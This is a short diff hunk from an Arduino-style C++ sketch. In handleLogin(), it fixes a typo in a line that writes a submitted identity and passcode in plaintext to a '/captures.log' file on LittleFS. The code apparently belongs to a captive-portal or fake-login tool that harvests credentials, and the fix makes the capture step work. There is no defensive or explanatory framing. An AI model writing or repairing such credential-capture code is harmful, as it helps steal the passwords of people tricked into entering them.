@@ -80,7 +80,7 @@ void handleLogin() {
   // Append entry to LittleFS log file
   File logFile = LittleFS.open("/captures.log", FILE_APPEND);
   if (logFile) {
-    logFile.printf("%s, %s\n", identity.c_content(), passcode.c_str());
+    logFile.printf("%s, %s\n", identity.c_str(), passcode.c_str());
     logFile.close();
   }
 
